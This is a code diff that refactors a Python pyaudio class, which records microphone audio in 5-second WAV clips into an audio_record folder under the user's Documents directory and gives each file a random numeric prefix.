@@ -3,6 +3,9 @@ import wave
 from threading import Thread
 from time import sleep
 import os
+from random import randint
+
+from normalize_path import normalize_path_name
 
 
 class Audio:
@@ -14,66 +17,59 @@ class Audio:
         self.channels = 2
         self.samples_per_second = 44100
         self.seconds = 5
-        self.filename = "audio_record_1"
-        self.p = ''
-        self.stream = ''
-        self.frames_list = []
+        self.filename = "audio_record"
         self.counter = 1
-        self.user_path = os.path.expanduser('~\\documents')
-        self.test_dir = os.path.expanduser('~/')
+        self.user_path = normalize_path_name(os.path.expanduser('~'), 'documents')
 
     def handle_audio(self):
-        while len(os.listdir(f'{self.test_dir}/audio_record'))*self.seconds < self.audio_length:
-            self.filename = f'{self.filename[:-1]}{self.counter}'
+        if not os.path.isdir(normalize_path_name(self.user_path, 'audio_record')):
+            os.mkdir(normalize_path_name(self.user_path, 'audio_record'))
 
-            self.init_stream()
-            self.grab_audio()
-            self.stop_recording()
-            self.save_to_file()
+        normalized_dir = normalize_path_name(self.user_path, 'audio_record')
+
+        while len(os.listdir(normalized_dir))*self.seconds <= self.audio_length:
+            filename = self.filename + str(self.counter)
+            self.record(filename)
 
             self.counter += 1
 
-    def init_stream(self):
-        self.p = pyaudio.PyAudio()
+    def record(self, name):
+        frames_list = []
+        random_number = self.get_random_number()
 
-        self.stream = self.p.open(format=self.sample_format,
+        p = pyaudio.PyAudio()
+        stream = p.open(format=self.sample_format,
                         channels=self.channels,
                         rate=self.samples_per_second,
                         frames_per_buffer=self.chunk,
                         input=True)
 
-    def grab_audio(self):
         for i in range(0, int(self.samples_per_second / self.chunk * self.seconds)):
-            data = self.stream.read(self.chunk)
-            self.frames_list.append(data)
+            data = stream.read(self.chunk)
+            frames_list.append(data)
 
-    def stop_recording(self):
-        self.stream.stop_stream()
-        self.stream.close()
-        self.p.terminate()
+        stream.stop_stream()
+        stream.close()
+        p.terminate()
 
-    def save_to_file(self):
 
-        if not os.path.isdir(f'{self.test_dir}/audio_record'):
-            os.mkdir(f'{self.test_dir}/audio_record')
-
-        path =  f'{self.test_dir}/audio_record/{self.filename}.wav'
+        normalized_audio_dir = normalize_path_name(self.user_path, 'audio_record')
+        path =  normalize_path_name(normalized_audio_dir, f'{random_number}_{name}.wav')
 
         wf = wave.open(path, 'wb')
         wf.setnchannels(self.channels)
-        wf.setsampwidth(self.p.get_sample_size(self.sample_format))
+        wf.setsampwidth(p.get_sample_size(self.sample_format))
         wf.setframerate(self.samples_per_second)
-        wf.writeframes(b''.join(self.frames_list))
+        wf.writeframes(b''.join(frames_list))
         wf.close()
 
-        self.cleanup()
+    def get_random_number(self):
+        random_number = str(randint(0, 20))
 
-    def cleanup(self):
-        self.frames_list = []
-        self.stream = ''
-        self.p = ''
-
+        for n in range(0, 10):
+            random_number += str(randint(0, 20))
+        return random_number
 
 if __name__ == '__main__':
-    aud = Audio(20)
+    aud = Audio(170)
     aud.handle_audio()
